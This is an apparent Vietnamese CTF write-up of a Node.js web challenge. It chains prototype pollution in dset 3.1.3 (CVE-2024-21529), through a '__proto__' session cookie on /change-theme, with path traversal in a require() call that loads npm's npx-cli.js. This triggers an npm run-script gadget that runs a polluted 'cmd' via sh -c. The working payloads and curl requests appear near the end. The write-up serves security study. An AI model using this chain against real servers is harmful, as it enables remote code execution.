---
title: HEPIHEPI
draft: false
date: 2026-10-05
ctf: aochinh26
category: web
difficulty: insane
tags:
  - Node.js
  - Prototype Pollution
  - dset
  - CVE-2024-21529
  - Path Traversal
  - RCE
---

# Đề bài
Challenge cho sẵn source code một web fansite chạy Node.js + Express. Mục tiêu là đọc được `/flag.txt`, mà file này chỉ `root` đọc được nên ta phải gọi binary setuid `readflag` để lấy nội dung, tức là cần đạt được RCE.

# Solution
Truy cập vào challenge, ta thấy một trang fansite của nhóm nhạc HepiHepi:

![image](./01-home.png)
Kiểm tra source code được cho, nhận thấy có file `package.json`
-> Đây là một bài `Node.js`
## 1. Kiểm tra `package.json` -> CVE-2024-21529
Ta kiểm tra file thấy `dependencies` chứa thư viện lạ thuộc bên thứ ba: `dset`

1. Quan sát thấy các thư viện khác ngoài `dset` đều có version có thể tự động nâng minor/patch (có dấu `^` ở trước version), trong khi version của `dset` bị ghim cứng ở `3.1.3`
![image](https://hackmd.io/_uploads/B1RlnPfofe.png)
-> Bài cố ý pin phiên bản này vì nó có lỗ hổng đã biết. 
Thử search `dset 3.1.3 vulnerability CVE` thì hiện ra 
[CVE-2024-21529](https://security.snyk.io/vuln/SNYK-JS-DSET-7116691) ở các phiên bản từ 3.1.3 trở về trước (<3.1.4)
![image](https://hackmd.io/_uploads/HJtZlufoGe.png)

2. Ta có thể dùng `npm audit` tự động báo luôn package nào có lỗ hổng đã biết
-> Tiện hơn nhiều so với việc kiểm tra toàn bộ dependency một lượt thay vì đọc tay từng thư viện.
![ctf_screenshot_under_1mb](https://hackmd.io/_uploads/rJeC0QdGifx.jpg)
:::info
Cách sử dụng như sau:
- `cd` vào thư mục chứa `package.json` (ở đây là `ez_web/src`)
- Nếu chưa có `package-lock.json` thì 
```bash!
npm i --package-lock-only
npm audit
```
- Nếu có rồi thì chỉ cần `npm audit`
:::


3. Có thể vào `docker desktop` để `View image packages and CVEs` rồi nhận được giao diện như sau
![image](https://hackmd.io/_uploads/Bk66u7QoMe.png)
Start analysis
![image](https://hackmd.io/_uploads/H1C8PQXjfg.png)

## 2. Prototype Pollution là gì?
### 2.1 Định nghĩa và ví dụ
Về cơ bản, ==prototype pollution== là lỗ hổng xảy ra khi kẻ tấn công ghi đè hoặc thêm `property` vào `Object.prototype` (`object` gốc dùng chung cho TOÀN BỘ `object` khác trong chương trình)
-> Từ đó `property` đó xuất hiện trên toàn bộ `object` khác (bao gồm mọi `object` hiện tại và cả những `object` sẽ được tạo ra trong tương lai)
Ví dụ dễ hiểu:
```javascript!
// Bình thường — object không có "isAdmin"
const anyObject = {};
console.log(anyObject.isAdmin); // undefined — như mong đợi

// Kẻ tấn công pollute Object.prototype
Object.prototype.isAdmin = true;

// Giờ MỌI object, kể cả cái vừa tạo sau đó, "tự nhiên" có isAdmin = true
const brandNewObject = {};
console.log(brandNewObject.isAdmin); // true  ← nguy hiểm!
```

Sau đó, attacker sẽ sử dụng `gadget` để gọi lại `property` mình đã thêm vào ở bước `prototype pollution`
### 2.2 Các khái niệm liên quan
#### Vậy câu hỏi đặt ra là 
1. `object`, `property`, `value`, `keypath` là gì?
2. Cách đạt được `Object.prototype`?
3. Cần bao nhiêu lần `__proto__` để đạt được `Object.prototype`?
4. `gadget` là gì?
#### Câu trả lời tương ứng
1.
:::info
`object` (đối tượng) là một cấu trúc dữ liệu gồm các cặp `key: value`

`property` (thuộc tính) là mỗi cặp `key-value` nằm trong object đó.

`keypath` (đường dẫn key) dùng để trỏ tới một `property` nằm sâu bên trong khi `object` bị lồng nhiều cấp
:::
2. Để trỏ được tới `Object.prototype` thì ta có các cách như sau, từ cơ bản đến bypass filter
:::info
Giả sử ta có `obj` là [object literals](https://www.geeksforgeeks.org/web-tech/object-literals/) như sau:
```json!
obj = { a: { b: {} } }
```
1. Truy cập trực tiếp:
``` javascript
obj.__proto__ === Object.prototype;  // true
```
``` javascript
obj["__proto__"] === Object.prototype;  // true
```
2. Truy cập dù thông qua `obj` hay `a` hay `b` đều như nhau
```javascript
obj.__proto__ === Object.prototype;   // true — tầng gốc
obj.a.__proto__ === Object.prototype;   // true — tầng 1
obj.a.b.__proto__ === Object.prototype;   // true — tầng 2
```
3. Nếu `__proto__` bị ban mà không ban `constructor` và `prototype` (Mọi `object literal` có `constructor` trỏ về `Object`)
-> `obj.constructor` = `Object`
-> `obj.constructor.prototype` = `Object.prototype`
```javascript
obj.constructor.prototype === Object.prototype;   // true
```
:::
3. Số bước `__proto__` cần đi phụ thuộc vào cách object được tạo
:::info
```javascript
{}.__proto__ === Object.prototype;                        // 1 bước (object literal)
[].__proto__.__proto__ === Object.prototype;              // 2 bước (array → Array.prototype → Object.prototype)
new Foo().__proto__.__proto__ === Object.prototype;       // 2 bước (Foo.prototype → Object.prototype)
Object.create(null).__proto__;                            // undefined — KHÔNG đi được, chuỗi bị cắt
```
:::
4. `gadget` = "công cụ có sẵn bị lợi dụng sai mục đích"
:::info
`Gadget` là một đoạn code đã có sẵn trong chương trình/thư viện (không phải do kẻ tấn công viết ra), mà khi bị kích hoạt với đúng điều kiện, nó vô tình thực hiện một hành động nguy hiểm mà lập trình viên gốc không hề có ý định cho phép người dùng điều khiển.
:::

## 3. Phân tích cách hoạt động của thư viện `dset`

Trước tiên, ta cần biết cách thư viện này hoạt động. Đọc [API của `dset`](https://www.npmjs.com/package/dset/v/3.1.3#api).
![image](https://hackmd.io/_uploads/S1I9Jdzsfg.png)
Ta biết `dset` là 1 hàm sinh ra với mục đích truyền `value` vào một `object` thông qua đường dẫn `path`.
Có thể đọc thêm [ví dụ](https://www.npmjs.com/package/dset/v/3.1.3#usage) để hiểu cách hàm `dset` hoạt động

Để hiểu hơn về lỗ hổng của phiên bản, ta so sánh source code giữa 2 phiên bản [3.1.3](https://app.unpkg.com/dset@3.1.3/files/merge/index.js) và [3.1.4](https://app.unpkg.com/dset@3.1.4/files/merge/index.js)
Ở đây tôi sử dụng tool online là [code-diff-viewer](https://tanphatdigital.com/vi/tools/code-diff-viewer)
![image](https://hackmd.io/_uploads/rJ7vu_foMx.png)

Ta nhận thấy `k` được chuyển thủ công về kiểu dữ liệu string trước khi được check an toàn.

Quan sát đoạn code dùng để check:
```javascript
if (k === '__proto__' || k === 'constructor' || k === 'prototype') break;
```
Phép so sánh `===` trong JS là so sánh nghiêm ngặt cả kiểu dữ liệu lẫn giá trị, KHÔNG tự động ép kiểu.
-> Ta phải ép kiểu thủ công với biến `k` chuyển về string trước khi so sánh với string `'__proto__'`, `constructor` và `prototype` để đảm bảo an toàn. Đó chính là cách fix lỗi của version 3.1.4. 

## 4. Phân tích về lỗ hổng ở version ==3.1.3== (CVE-2024-21529)
Suy luận từ cách fix lỗi của version 3.1.4, ta biết lỗi của version 3.1.3 nằm ở việc không chuyển về `string` cho trùng kiểu dữ liệu trước mà đã check an toàn.
=> Dẫn tới việc người dùng khai thác thông qua kiểu dữ liệu `array` ở `path`
![image](https://hackmd.io/_uploads/H1kTujGife.png)

Version 3.1.3:
```javascript
function dset(obj, keys, val) {
	keys.split && (keys=keys.split('.'));
	var i=0, l=keys.length, t=obj, x, k;
	while (i < l) {
		k = keys[i++];
		if (k === '__proto__' || k === 'constructor' || k === 'prototype') break;
		t = t[k] = (i === l) ? val : (typeof(x=t[k])===typeof(keys)) ? x : (keys[i]*0 !== 0 || !!~(''+keys[i]).indexOf('.')) ? {} : [];
	}
}

exports.dset = dset;
```
:::warning
Lưu ý: 
- Chỉ có path dạng array `[...,'y','z']` mới khai thác được vì giá trị của đầu có thể là 1 mảng con `['x']`==(nested array)== 
 (Viết `[x]` không có nháy sẽ gây `ReferenceError` vì `x` chưa được khai báo. Phải viết `['x']`)
-> `keys=[['x'],'y','z']` (thay cho `keys=['x','y','z']`) 
=> `t[k]` = `t[['x']]` (`['x']` bị coerce thành string `'x'`)
<=> `t[k]` = `t['x']` 
(Lúc này đã bypass được bước check an toàn)
- Path dạng string `'x.y.z'` thì chịu vì sau khi split thì cũng chỉ thành `['x','y','z']` chứ không thể nào là `[['x'],'y','z']`
-> Ví dụ:
`ka.hac.u` sau khi split -> `['ka','hac','u']`
(Có cố gắng như nào cũng không biến được về dạng `[['ka'],'hac','u']`)
:::

## 5. Đoạn code sử dụng `dset` có thể khai thác
Quay trở lại với `index.js` của bài, ta thấy route `/change-theme` có sử dụng `dset`
```javascript
app.post('/change-theme', requireSession, (req, res) => {
    const { themeVar, themeVal } = req.body
    if (typeof themeVar !== 'string' || typeof themeVal !== 'string') {
        return res.status(400).send('themeVar and themeVal must be strings')
    }
    lib.dset(sessionStorage, [[req.sessionID], themeVar], themeVal)
    res.send('Change theme successfuly')
})

```
Ở đây, người dùng kiểm soát được `req.sessionID`, `themeVar` và `themeVal` tùy ý. 
ĐẶC BIỆT code có cấu trúc giống ta phân tích ở trên
```javascript!
lib.dset(sessionStorage, [[req.sessionID], themeVar], themeVal)
```
1. object: ==sessionStorage==
2. path: ==`[`[req.sessionID], themeVar`]`==
3. value: ==themeVal==

Khi đó, chỉ cần:
1. `Cookie: session="__proto__"` 
-> Truy cập được `Object.prototype` để gây pollution 
2. `themeVar` = `...`
3. `themeVal` = `...`

`themeVar` và `themeVal` tạm thời để đó vì chưa tìm được gadget để bị pollution

## 6. Path Traversal (để kích hoạt gadget)
Bấm vào một thành viên, ta sang trang chi tiết với URL dạng `/member?memberID=member1`: 
![image](./02-member.png)

Ta thấy một chỗ đáng ngờ khi input của user (qua param `memberID`) được truyền vào `require()` mà không hề lọc. 
```javascript!
app.get('/member', requireSession, (req, res) => {
    memberID = req.query.memberID
    memberStats = require(`./members/${memberID}.js`)
    res.render('member', { member: memberStats })
})
```
=> Có thể dùng `Path Traversal` để load một file `.js` bất kỳ trên hệ thống
## 7. File `.js` nào cần được gọi?
Mục đích của ta là tìm một file `.js` mà khi `require` là nó tự chạy code ở `top-level` và gọi `child_process.spawn` với một object `options` kế thừa `Object.prototype` (đã bị tôi pollute).
### 7.1 Điểm giữa (`runScriptPkg`)
Để tìm các file JavaScript tiềm năng, trước hết ta phải liệt kê các file có đuôi `.js` và có điều kiện kiểu `if (obj.prop)` không check `hasOwnProperty` trong `files` của container.
```bash
docker exec f476266ec6b8 sh -c 'find / -name "*.js" 2>/dev/null'
```
Nhận thấy có quá nhiều file -> dò tay sẽ xảy ra nhiều sai sót và  quá tốn thời gian. Tôi chuyển hướng đi research các gadget liên quan.

May mắn thay, tôi nhập trên google `prototype pollution remote code execution node.js paper` và tìm ra bài báo về [Prototype Pollution Leads to Remote Code Execution in Node.js](https://www.usenix.org/system/files/usenixsecurity23-shcherbakov.pdf) của Mikhail Shcherbakov 

Trong đó có `gadget example` sử dụng property `cmd`
![image](https://hackmd.io/_uploads/rygX3rmize.png)
![image](https://hackmd.io/_uploads/SkDn2B7izx.png)
Vậy từ đó ta chỉ cần tìm `cmd = options.cmd`/`cmd=options.cmd` trong file list của container
Vào `Exec` của container rồi nhập command sau:
```bash
find / -name "*.js" 2>/dev/null | xargs grep -lnE "cmd\s*=\s*options\.cmd" 2>/dev/null
```
1. `find / -name "*.js" 2>/dev/null`
- `find`: duyệt cây thư mục để liệt kê file.
- `/`: là điểm bắt đầu, ở đây là gốc filesystem của container (không phải máy host)
- `-name "*.js"`: lọc chỉ lấy tất cả file có đuôi `.js`.
- `2>/dev/null`: vứt bỏ stream lỗi (file descriptor 2 = stderr) chỉ để hiện mỗi các file cần tìm
2. `|`
- `Pipe`: lấy stdout của find (danh sách đường dẫn .js) làm stdin cho lệnh kế tiếp.
3. `xargs grep -lnE "cmd\s*=\s*options\.cmd" 2>/dev/null`
    - `xargs`: đọc danh sách file từ stdin rồi ghép chúng thành đối số cho `grep`. Tức là biến `find ... | xargs grep` thành `grep PATTERN file1.js file2.js file3.js ....` (Cần xargs vì grep nhận tên file qua đối số, không phải qua stdin.)
- `grep` tìm dòng khớp mẫu trong các file đó. Các cờ:
    * `-l` (lowercase L): chỉ in tên file có khớp, không in nội dung dòng.
    * `-n`: in kèm số dòng. (Lưu ý: -l và -n dùng chung thì -l thường thắng, chỉ ra tên file — muốn thấy số dòng thật thì bỏ -l, chỉ để -n.)
    * `-E`: bật extended regex, để hiểu \s, *, +... như regex thay vì ký tự thường.
- `"cmd\s*=\s*options\.cmd"` là mẫu regex:
    * `cmd`: chữ cmd nguyên văn.
    * `\s*`: không hoặc nhiều ký tự khoảng trắng (space, tab). Để khớp cả `cmd = options.cmd` lẫn `cmd=options.cmd`.
    * `=`: dấu bằng nguyên văn.
    * `options`: chữ nguyên văn.
    * `\.`: dấu chấm theo nghĩa đen. Phải escape bằng `\` vì trong `regex`, `.` được hiểu là mọi ký tự 
    * `cmd`: chữ cuối.
- `2>/dev/null` thứ hai: nuốt lỗi của grep (ví dụ gặp file đã biến mất, hoặc "No such file"), giữ output sạch.

![image](https://hackmd.io/_uploads/rksXlRmoMl.png)

Mở file `run-script-pkg.js`, tìm xem ngay trước dòng `if (options.cmd)` có `hasOwnProperty` hay `Object.create(null)` không 
-> Nếu không có thì đúng là gadget
### 7.2 Từ gadget xuôi đến `spawn`
Sau khi `cat` thì chỉ thấy trước `cmd = options.cmd` không hề chứa biện pháp đảm bảo an toàn (`hasOwnProperty` hay `Object.create(null)`)
![image](https://hackmd.io/_uploads/HkuEWRmiGx.png)

Bây giờ ta mò xem cmd sẽ đi đâu:
1. Sau khi ta pollute `cmd`, code chạy hàm `makeSpawnArgs` rồi gắn giá trị cho `[spawnShell, spawnArgs, spawnOpts]`
![image](https://hackmd.io/_uploads/S11fWRVoGl.png)
Mà hàm `makeSpawnArgs` nằm ở file `make-spawn-args.js`
![image](https://hackmd.io/_uploads/r1ABWANjfe.png)
ta mở lên để xem đã gắn giá trị gì 

2. Kiểm tra code ta thấy như sau 
![image](https://hackmd.io/_uploads/H1aWMCEsGe.png)
Ta thấy hàm trả về `[cmd, args, spawnOpts]` ứng với `[spawnShell, spawnArgs, spawnOpts]`
![image](https://hackmd.io/_uploads/rywywRNoze.png)
với `cmd` chứa pollute, `args = []`  và `spawnOpts`
* ![image](https://hackmd.io/_uploads/rkdwHC4sfx.png)
* ![image](https://hackmd.io/_uploads/SyrF8ANizl.png)

| spawnShell | spawnArgs |                             spawnOpts                              |
|:----------:|:---------:|:------------------------------------------------------------------:|
|   `cmd`    |   `[]`    | `{env:spawnEnv, stdioString, stdio, cwd: path, shell: scriptShell,}` |

 Quan trọng nhất là `shell: scriptShell` mà `scriptShell = 'sh'` (Vì shell là chuỗi 'sh' (mặc định của libnpmexec trên non-Windows))

3. Sau khi gắn giá trị, chương trình chạy hàm `promiseSpawn` với `[spawnShell, spawnArgs, spawnOpts]` đã gắn giá trị và `extra`
![image](https://hackmd.io/_uploads/rJ9uFREife.png)
Ta kiểm tra source code của `promiseSpawn` ở thư mục `@npmcli/promise-spawn` 
![image](https://hackmd.io/_uploads/BJ5AOCNjMl.png)
Sau khi vào thì thấy hàm `promiseSpawn` gọi hàm `spawnWithShell` khi `(opts.shell) = 'sh'` như sau:
![image](https://hackmd.io/_uploads/HJGLcR4ozg.png)

4. Ta kiểm tra hàm `spawnWithShell`
![image](https://hackmd.io/_uploads/SJtz-1HiGg.png)
Vì `shell: 'sh'` nên `opts.shell` là `'sh'` nên `command = 'sh'`
-> ==command = 'sh'== 
![image](https://hackmd.io/_uploads/BJ31XJHszg.png)
Xác nhận là trường hợp của Linux nên push ==['-c', script]== vào `realArgs` với `script = cmd`. Đây là bước build chuỗi `script` cuối cùng sẽ được đưa vào `sh -c`
Xác nhận là trường hợp của Linux nên command không phải cmd.exe -> đi nhánh else, push ['-c', script] push `['-c', script]`
Sau khi push, `promiseSpawn(command, realArgs, options)` được gọi lại với `shell: false`

5. Chạy lại hàm `promiseSpawn`, lần này vì `shell: false` rồi nên không chạy hàm `spawnWithShell` nữa
Lần gọi này chạy thẳng xuống dòng: 
`const proc = spawn(cmd, args, opts)`
![image](https://hackmd.io/_uploads/HJvQlgHjzl.png)
Hàm [spawn](https://nodejs.org/api/child_process.html#child_processspawncommand-args-options) được require ở đầu file giờ sẽ được thực thi nếu kích hoạt được hàm `runScriptPkg`, chính là thứ để đạt được RCE (Remote Code Execution)
![image](https://hackmd.io/_uploads/S148hJHsfg.png)
![image](https://hackmd.io/_uploads/HJ1IWgSiMx.png)
Khi gọi hàm, Node sẽ thực hiện system call thực sự tới hệ điều hành để thực thi lệnh, hoàn toàn tách biệt khỏi tiến trình Node đang chạy.
Ở đây `const proc = spawn(cmd, args, opts)` 
<=> `const proc = spawn('sh', ['-c', cmd], ...)`
6. Vậy mục đích RCE của ta đã thực hiện được nếu kích hoạt được hàm `runScriptPkg`



Chuỗi xử lý đầy đủ, chính xác của điểm cuối là:

| Bước | Hàm | Việc làm |
|---|---|---|
| 1 | `runScriptPkg` | đọc `options.cmd` (bị pollute) → gán vào biến `cmd` |
| 2 | `makeSpawnArgs` | đóng gói lại, không đổi `cmd`, chỉ set `spawnOpts.shell = true` (default) |
| 3 | `promiseSpawn` | thấy `opts.shell = scriptShell ('sh')`  → gọi `spawnWithShell` |
| 4 | `spawnWithShell` | `command = "sh"` (vì `shell === 'sh'` → default platform shell), `script = cmd`, đẩy ra `realArgs = ['-c', script]` |
| 5 | `promiseSpawn(command, realArgs, ...)` (đệ quy lại, lần này `opts.shell = false`) | gọi thẳng `child_process.spawn("sh", ["-c", cmd], ...)` |

```
...
 └── @npmcli/run-script: runScriptPkg(options)           ← options.cmd bị pollute
     └── makeSpawnArgs → promiseSpawn(cmd, [], { shell: 'sh' })
         └── spawnWithShell → promiseSpawn('sh', ['-c', cmd], { shell: false })
             └── child_process.spawn('sh', ['-c', cmd])
```
### 7.3 Từ entry point đến gadget
#### Mò ngược lên từ `runScriptPkg`
Bây giờ ta cần đọc file `.js` nào sử dụng hàm `runScriptPkg`
Việc của ta là phải tìm file `.js` nào gọi runScriptPkg hoặc require nó bằng lệnh bash sau trong Docker exec:
```bash
grep -rln "runScriptPkg\|run-script-pkg" /usr/lib/node_modules/npm/node_modules/ 2>/dev/null
```
trả về kết quả như sau
![image](https://hackmd.io/_uploads/rk1iEgHozg.png)

Trong `signal-manager.js` thì `run-script-pkg.js` nằm ở comment thôi nên không có tác dụng gì 
![image](https://hackmd.io/_uploads/SyQJwmHifg.png)
`run-script.js` mới là file ta cần đọc.
![image](https://hackmd.io/_uploads/BJVQvXSjfg.png)
Module export hàm `runScript` và gắn thêm thuộc tính `isServerPackage` vào hàm đó. Vì vậy, ta tiếp tục tìm xem file `.js` nào dùng hàm `runScript`
```bash
grep -rlF "require('@npmcli/run-script')" / --include="*.js" 2>/dev/null
```
* `-r`: tìm đệ quy.
* `-l`: chỉ hiện tên file khớp.
* `-F`: tìm chuỗi chính xác.
* `/`: tìm từ thư mục gốc, bao gồm cả thư mục con.
* `--include="*.js"`: cuối tên file phải có `.js`
* `2>/dev/null`: bỏ những dòng lỗi

![image](https://hackmd.io/_uploads/BJMieG8jGl.png)

Nhìn ảnh, thấy ngay `libnpmexec/lib/run-script.js` là tiềm năng nhất. Kiểm tra thì thấy file xuất hàm `run`. 
![image](https://hackmd.io/_uploads/By0A0IUoMg.png)

-> Ta mò tiếp ai sử dụng hàm `run`
Ta grep `require('./run-script.js')` ở path `libnpmexec/lib`
-> Payload:
```
grep -rl "require('./run-script.js')" /usr/lib/node_modules/npm/node_modules/libnpmexec/lib/
```
![image](https://hackmd.io/_uploads/B1DMYjUiMg.png)

Đọc file `index.js` thấy export hàm `exec`
Ta lại mò lên tiếp, check thử `package.json` thấy để dùng hàm `exec` phải `require('libnpmexec')` vì (`"main": "lib/index.js"`)
![image](https://hackmd.io/_uploads/BkLUiiLiGl.png)
-> Payload:
```
grep -rl "require('libnpmexec')" /usr/lib/node_modules/npm/
```
![image](https://hackmd.io/_uploads/SJfW2j8iMl.png)
`exec.js` xuất ra class `Exec` với `module.exports = Exec`
![image](https://hackmd.io/_uploads/BkHNyHvszl.png)
với các method đáng để ý là `exec`, `callExec`:
```javascript 
async exec (args) {
    return this.callExec(args)
  }
```
```javascript
async callExec (args, { name, locationMsg, runPath } = {}) {
    let localBin = this.npm.localBin
    let pkgPath = this.npm.localPrefix

    // This is where libnpmexec will actually run the scripts from
    if (!runPath) {
      runPath = process.cwd()
    } else {
      // We have to consider if the workspace has its own separate versions
      // libnpmexec will walk up to localDir after looking here
      localBin = resolve(this.npm.localDir, name, 'node_modules', '.bin')
      // We also need to look for `bin` entries in the workspace package.json
      // libnpmexec will NOT look in the project root for the bin entry
      pkgPath = runPath
    }
```
 trả về giá trị vào biến cục bộ `libexec` để cuối cùng export class `Exec`

![image](https://hackmd.io/_uploads/SJKMTkdjfg.png)

```
...
 └── Exec (lib/commands/exec.js)
     └── exec(args)
          └── callExec(args)
               └── libexec(...)                  = require('libnpmexec') → libnpmexec/lib/index.js: exec
                    └── run(...)                 (index.js)
                         └── libnpmexec/lib/run-script.js: run
                              └── @npmcli/run-script: runScript
                                   └── @npmcli/run-script: runScriptPkg(options)   ← options.cmd bị pollute
                                        └── ...
```

Vì npm gọi class và method động nên khó lần ngược tiếp bằng grep. Chuyển sang đi xuôi từ entry point.


#### Mò theo chiều xuôi
Quay ngược lại nhìn về [Path Traversal](#Path-Traversal-để-kích-hoạt-gadget), ta thấy ta chỉ `require()` được file `.js`, nên mục tiêu cuối cùng là file nào khi require là tự chạy mà không cần điều kiện nào server không có sẵn

Để làm thế, trước tiên ta phải tìm thử các entry point cần thiết như [main](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#main) và [bin](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#bin) từ file `package.json` ở đường dẫn `/usr/lib/node_modules/npm/package.json`
```json
 "main": "./index.js",
  "bin": {
    "npm": "bin/npm-cli.js",
    "npx": "bin/npx-cli.js"
  },
```
Kiểm tra `npm-cli.js` thì thấy code chỉ export chứ không có chạy gì ở top level

Trong khi đó, `npx-cli.js` có `#!/usr/bin/env node` và có thực hiện một hàm `cli`
```javascript
const cli = require('../lib/cli.js')
...
cli(process)
```

Vậy giờ ta đọc `cli.js`, thấy có require `./cli/validate-engines.js` và `cli/entry.js`
![image](https://hackmd.io/_uploads/SkOAbnvjMe.png)
Dựa theo tên file thì tôi thử xem source của file `entry.js` trước.
```javascript
const Npm = require('../npm.js')
const npm = new Npm()
...
const { exec, command, args } = await npm.load()
 if (!exec) {
      return exitHandler.exit()
    }
...
const execPromise = npm.exec(command, args)
...
await execPromise
```

Vậy giờ ta đi nhìn source của `npm.js` xem method `exec` được truyền vào như nào sau khi `load`

Ở đây thấy Npm require lệnh theo `${command}` động sau khi kiểm tra và đối chiếu `cmd` với danh sách command ở `utils/cmd-list.js` bằng `deref()`
![image](https://hackmd.io/_uploads/Hkg91WdsMe.png)
thấy trong danh sách có `exec`
![image](https://hackmd.io/_uploads/SJVeyx_jMx.png)

Trước tiên ở `entry.js` thì `npm.load()` sẽ set `exec: true`
```javascript
async load () {
    ...
return { exec: true, command: commandArg, args: this.argv }
  }
```
Sau khi `exec: true` thì `if (!exec) {...}` không được thỏa nên code vẫn chạy tiếp `npm.exec()`

Sau đó thì `npm.exec()` gọi `#exec()` trực tiếp và trả về kết quả của nó.
```javascript
async exec (cmd, args = this.argv) {
    if (!this.#command) {
      ...
    } else {
      return this.#exec(cmd, args)
    }
  }
```
Vậy đọc tiếp source code, định nghĩa `#exec()` là để gọi 1 lệnh npm
```javascript
// Call an npm command
const Command = this.constructor.cmd(cmd)
const command = new Command(this)
...
return time.start(`command:${cmd}`, () =>
  execWorkspaces
    ? command.execWorkspaces(args)
    : command.exec(args)
)
```
 
* Dòng 1: Lấy class tương ứng với lệnh cần chạy.
Ví dụ, nếu `cmd` = `'exec'`, thì `this.constructor.cmd(cmd)` sẽ thực hiện:
```javascript
static cmd(c) {
  const command = deref(c)

  if (!command) {
    ...
    })
  }

  return require(`./commands/${command}.js`)
}
```
-> `require('./commands/exec.js')` và trả về class Exec cho `Command`

* Dòng 2: 
Tạo instance từ class vừa lấy được. Về mặt ý nghĩa, tương đương:
```javascript!
const Exec = require('./commands/exec.js')
const command = new Exec(this)
```
* Các dòng cuối:
Nếu không chạy theo chế độ workspace, npm gọi 
```javascript
command.exec(args)
```
-> Vậy ta đã tìm được Class `Exec` cùng method `exec()` và kết nối được hai đầu là điểm đầu và điểm giữa

![image](https://hackmd.io/_uploads/r1Wz1b_sGe.png)

```text
npx-cli.js
└── require('../lib/cli.js') → cli(process)
    └── cli/entry.js: new Npm() → npm.load() → { exec: true, command, args }
    └── npm.exec → #exec → require('./commands/exec.js')
        └── Exec (lib/commands/exec.js)                 ← new Exec(npm)
            └── exec(args)
                └── callExec(args)
                    └── libexec(...) 
                        └── ...
```

=> Ta phải require file `npx-cli.js` bằng Path Traversal
### 7.4 Flow đầy đủ khi require `npx-cli.js`
```
npx-cli.js
└── require('../lib/cli.js') → cli(process)
    └── cli/entry.js: new Npm() → npm.load() → { exec: true, command, args }
    └── npm.exec → #exec → require('./commands/exec.js') → new Exec(npm).exec(args)
        └── Exec.callExec(args) → libexec(...)
            └── libnpmexec/lib/index.js: run(...) → runScript(...)     (libnpmexec/lib/run-script.js)
                └── @npmcli/run-script: runScriptPkg(options)           ← options.cmd bị pollute
                    └── makeSpawnArgs → promiseSpawn(cmd, [], { shell: 'sh' })
                        └── spawnWithShell → promiseSpawn('sh', ['-c', cmd], { shell: false })
                            └── child_process.spawn('sh', ['-c', cmd])

```
## 8. Kết nối các mảnh ghép lại với nhau 
### 8.1 Tóm tắt chuỗi tấn công

Chuỗi gồm 3 mắt xích:

1. Prototype pollution: `dset@3.1.3` (CVE-2024-21529) cho phép ghi `cmd` vào `Object.prototype` qua route `/change-theme`.
2. Gadget: hàm `runScriptPkg` của npm đọc `options.cmd` mà không kiểm tra own property, rồi chạy lệnh qua `sh -c`.
3. Kích hoạt: path traversal ở route `/member` cho phép `require()` file `npx-cli.js` của npm, file này chạy npm và đi tới gadget.
Để pollute, ta phải điều chỉnh được `req.sessionID`, `themeVar` và `themeVal` phù hợp

### 8.2 Thực hiện exploit
Trước tiên ta đọc lại `index.js` của challenge 
```javascript!
app.get('/', (req, res) => {
    let sessionID = req.cookies.session
    if (!sessionID || !sessionStorage[sessionID]) {
        sessionID = uuidv4()
        sessionStorage[sessionID] = {
            theme: 'light'
        }
        res.cookie('session', sessionID)
    }
    ...
})
```
Trước hết ta tìm `sessionID` ở đâu, thấy khi GET `/` thì hiện `session` thể hiện giá trị gốc của `sessionID` tại response
![image](https://hackmd.io/_uploads/ry0OoWusfx.png)
Giờ ta đổi giá trị của session thành `__proto__` hoặc `"__proto__"` tại route `/change-theme`
(Không hiểu tại sao `'__proto__'` lại không chạy)
```
Cookie: session=__proto__

{
"themeVar" = "cmd",
"themeVal" = "..."
}
```
Để biết nên để payload gì cho `themeVal` thì trước tiên tìm cách để chạy file `readflag.c` trên shell
Đọc lại `Dockerfile` thấy tác giả đã biên dịch từ file C thành file thực thi rồi
![image](https://hackmd.io/_uploads/SkEK1z_jzl.png)
Việc của ta bây giờ chỉ là kích hoạt file binary này, lưu lại vào một nơi để ta lưu được flag.

Ta chọn folder `/tmp` vì thường cho phép người dùng thường tạo file và thư mục hiện tại có thể không có quyền ghi. 
#### flag.txt
Tôi thử chọn tên file là `flag.txt` rồi vào container đọc sau

-> `"themeVal" = "/readflag > /tmp/flag.txt"`

Response trả về tín hiệu 200 với nội dung `Change theme successfuly` chỉ chứng minh handler đã chạy xong

Sau đó dùng Path Traversal để require `npx-cli`
-> `/member?memberID=../../usr/lib/node_modules/npm/bin/npx-cli`

Đường traversal `../../` chỉ đúng khi app ở `/app` (Docker), và chạy với npm 10.9.9 của image
Lúc này 
```javascript
memberStats = require(`./members/${memberID}.js`)
```
có dạng 
```javascript!
memberStats = require(`./members/../../usr/lib/node_modules/npm/bin/npx-cli.js`)
```
Sau khi gửi thì nhận thấy container bị đóng luôn

-> npm thoát khi `npm exec` chạy xong, kéo theo server và container tắt. Vì vậy payload cần sleep để giữ tiến trình sống.

Mà Gadget chỉ chạy một lần cho mỗi tiến trình, vì Node cache module `npx-cli.js` sau lần require đầu. Trước mỗi lần thử, cần restart container.

Tôi restart container, sau đó thêm `sleep 120` vào payload để có thời gian đọc flag
-> `"themeVal" = "/readflag > /tmp/flag.txt; sleep 120"`
![image](https://hackmd.io/_uploads/B1GZszuizg.png)
![image](https://hackmd.io/_uploads/HklIozusGl.png)
Kiểm tra file `flag.txt` tại container trong lúc `sleep` còn chạy
![image](https://hackmd.io/_uploads/H1U_sMOife.png)
-> Flag: 
`W1{fake_flag}`

#### flag.js
Vì cách `flag.txt` chỉ lấy được flag local, nếu mở instance sẽ không lấy được
-> Ta tạo `flag.js` để require bằng Path Traversal (chỉ require được file `.js`)

-> Payload:
`"themeVal" = "/readflag > /tmp/flag.js 2>&1; sleep 120"`
(vì flag có định dạng `text` nên khi vào file `.js` sẽ lỗi, ở đây `2>&1` giúp lấy luôn cả phần lỗi là flag)


```bash!
curl -b "session=__proto__" "http://localhost:5005/member?memberID=../../tmp/flag"
```
hoặc làm trên PortSwigger
![image](https://hackmd.io/_uploads/HkIbVFdozg.png)
![image](https://hackmd.io/_uploads/BJeLVFOizx.png)
![image](https://hackmd.io/_uploads/ryJvVK_ozl.png)
![image](https://hackmd.io/_uploads/B1ODEK_oGx.png)

-> Flag: 
`W1{fake_flag}` (sẽ là flag thật khi chạy instance)
